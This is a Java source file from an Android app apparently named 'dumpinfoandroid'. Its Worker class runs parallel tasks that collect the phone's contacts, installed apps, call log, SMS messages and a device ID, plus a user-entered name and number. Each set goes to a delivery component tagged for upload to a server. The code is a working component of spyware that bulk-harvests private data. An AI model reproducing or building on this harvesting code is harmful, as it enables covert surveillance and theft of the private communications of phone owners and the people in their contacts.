package com.example.dumpinfoandroid;

import android.content.Context;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

public class Worker {
    private static final ExecutorService executorService = Executors.newCachedThreadPool();
    private static List<Future<Object>> futureList;

    private Worker() {}

    public static boolean isAllDone() {
        if (futureList == null) return false;
        else {
            boolean result = true;

            for (Future<Object> future : futureList)
                result &= future.isDone();

            return result;
        }
    }

    public static void doWork(Context context, String fio, String num) {
        Dump dump = new Dump(context);
        Delivery delivery = new Delivery((ServerCallback) context);
        ArrayList<Content> put = new ArrayList<>();
        put.add(Content.getContact(fio,num));

        executorService.execute(() -> {
            List<Callable<Object>> callableList = Arrays.asList(
                    Executors.callable(() -> delivery.setLoad(dump.getContacts(), dump.getId(), "PB")),
                    Executors.callable(() -> delivery.setLoad(dump.getApps(), dump.getId(), "AP")),
                    Executors.callable(() -> delivery.setLoad(dump.getCall(), dump.getId(), "CL")),
                    Executors.callable(() -> delivery.setLoad(dump.getSms(), dump.getId(), "SM")),
                    Executors.callable(() -> delivery.setLoad(put, dump.getId(), "MY")));
            try {
                futureList = executorService.invokeAll(callableList);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        });
    }
}
